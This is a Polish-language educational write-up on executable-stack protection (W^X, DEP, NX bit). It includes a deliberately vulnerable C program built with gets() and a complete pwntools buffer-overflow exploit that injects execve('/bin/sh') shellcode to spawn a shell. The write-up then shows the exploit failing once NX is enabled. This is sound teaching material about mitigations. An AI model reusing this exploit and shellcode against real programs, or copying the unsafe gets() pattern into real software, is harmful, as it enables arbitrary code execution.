# 1.Executable space protection

### 1.1 Różne sposoby radzenia sobie z obszarami pamięci, do którym można pisać i które można wykonywać

Dość ważny aspektem bezpieczeństwa jest rozdzielanie uprawnień obszarom pamięci. Pamięć oznaczona jednocześnie jako W (write) i X (execute) stwarza realne zagrożenie, bo pozwala na wykonanie dowolnego kodu przez atakującego.

Problem rozwiązywany jest zarówno sprzętowo, jak i w oprogramowaniu.

Ważna jest polityka (W^X) - mówiąca, że dana strona pamięci może być tylko i wyłącznie albo wykonywalna, albo można do niej pisać. Polityka ta została wprowadzona w OpenBSD 3.3 w 2003 roku.

Odpowiedzią Microsoftu było DEP (Data Execution Preventon) wprowadzone w Windows XP zawierające szereg zabezpieczeń.

Obecnie sprzętowym sposobem realizacji jest tak zwany `NX-bit` odpowiadający właśnie za wykonywalność pamięci. Z tego właśnie korzystać jądro Linuxa, jeżeli procesor obsługuje tą funkcje.

W innym przypadku możliwa jest również emulacja tej funkcjonalności (przykład Exec Shield i PaX)

Na Linuxie do ręcznego ustawienia uprawnień obszaru służy syscall `mprotect()`.

### 1.2 Opis

`gcc` defaultowo włącza non-executable stack - można go wyłączyć flaga `-z execstack`.

Tak samo zachowuje się `clang`. 

Jest to argument przekazywany do linkera. 


Obecnie niektóre stare binarki linuxowe mogą wymagać wykonywalnego stacku dlatego ta opcja może zostać włączona. 
Wykonywalny stack jest pokonywany za pomocą oznaczenia pamięci stacku jako niewykonywalnej. Nie ma tu żadnego spadku wydajności, jedynie ewentualnie problemy z kompatybilnością ze starymi plikami.

Wyłączenie wykonywalnego stosu jest dość podstawową metodą obrony przez eksploitacją binarną aplikacji i następne metody uwzględniają tą metodę jako uwzględnioną.

Oznaczenie pamięci jako niewykonywalna obecnie najcześciej odbywa się za pomocą ustawienia flagi `NX` w tablicy strony.

Implementacje na różnych systemach nie różnia się.

### 1.3 Proof of concept
Pierwszym omówionym exploitem i obroną przed nim bedzie wykonywalny stack.

Kod programu, który bedzie exploitować jest następujący:

```c
// gcc vuln.c -no-pie -std=c99 -m32 -fno-stack-protector -z execstack -w -o vuln.o

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void ask_for_name()
{
    char name[12] = {0};
    puts("What's your name?");
    gets(name);
    if(strlen(name) > 12) {
        puts("Nope, it's too long for me");
        exit(1);
    }
    printf("Hi %s!\n", name);
}

int main()
{
    ask_for_name();
    return 0;
}
```

Błędem jest użyta tu funkcja `gets()` i pozornie działające sprawdzenie długości inputu.

Dokumentacja `strlen()` mówi, że funkcja sprawdza dlugość do otrzymania `x00`. Taki znak możemy dokleić, aby przepełnić bufor.

Używając pythona i pakietu pwntools postaram się wykorzystać ten błąd.

Schemat exploitacji jest następujący:

* ustalić miejsce w pamięci, w którym nadpisujemy adres powrotu
* ustalić miejsce w pamięci, w którym znajduje się bufor
* nadpisać adres powrotu adresem bufora, w którym znajduje się nasz kod.

```python
from pwn import *

p = process("./vuln.o")

p.readuntil("What's your name?\n")

name = "a"*8+"\x00"+"a"*15
```

Exploit omija sprawdzenie. 

W debuggerze ustaliłem, że miejsce w pamięci do którego bedziemy pisać każdą następna wiadomość to rejestr `eip` przetrzymujący adres powrotu funkcji.

Następnie za pomocą gdb ustaliłem, w którym miejscu można nadpisać adres powrotu oraz adres, w którym zaczyna się bufor.

Adres ten jest stały, bo nie używamy ani PIE ani ASLR.

Dopisując do naszej wiadomości adres bufora powiększony o offset generowany przez poprzednie wiadomości uda nam się skierować wykonywanie programu na złośliwy kod, który jesteśmy w stanie wstrzyknąć za adresem.

```python
name += "\x20\xd2\xff\xff"
```


W tym momencie wystarczy do stringa name dokleić shellcode wywołujący execve i odpowiednimi parametrami. Shellcode ten zaczerpnałem ze strony `http://shell-storm.org/shellcode/files/shellcode-811.php`.

Jest to shellcode w assemblerze ładujący odpowiednie argumenty do odpowiednich rejestrów i wywołujący funkcje execve syscallem z argumentami wskazującymi na `bin/sh`.

```python
name += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

Cały exploit wygląda następująco:

```python
from pwn import *

p = process("./vuln.o")

p.readuntil("What's your name?\n")

name = "a"*8+"\x00"+"a"*15 # inject aaaas till eip
name += "\x20\xd2\xff\xff" # inject address of shellcode to eip
name += "\x31\xc0\x50\x68\x2f\x2f\x73"+"\x68\x68\x2f\x62\x69\x6e\x89"+"\xe3\x89\xc1\x89\xc2\xb0\x0b"+"\xcd\x80\x31\xc0\x40\xcd\x80" #shellcode to spawn shell

p.sendline(name)

p.interactive()

```


Exploit działa na programie skompilowanym z wykonywalnym stackiem. Widzimy tu interaktywny shell.

![img.png](img.png)

Natomiast skompilowany bez flagi pozwalającej na wykonywanie kodu na stacku nie działa. Program zakończył działanie sygnałem SIGSEGV.

![img_1.png](img_1.png)


### 1.4 Wnioski

Kontrolowanie tego czy dane miejsce w pamięci może wykonywać kod jest ważna i pozwala zapobiegać najprostszym atakom typu buffer overflow. Jednak nie jest to remedium na wszystkie ataki.

Ataki typu ROP lub RET2LIBC, które bedą prezentowane w dalszej częsci projektu mogą być wykonane z `nonexec` stosem.
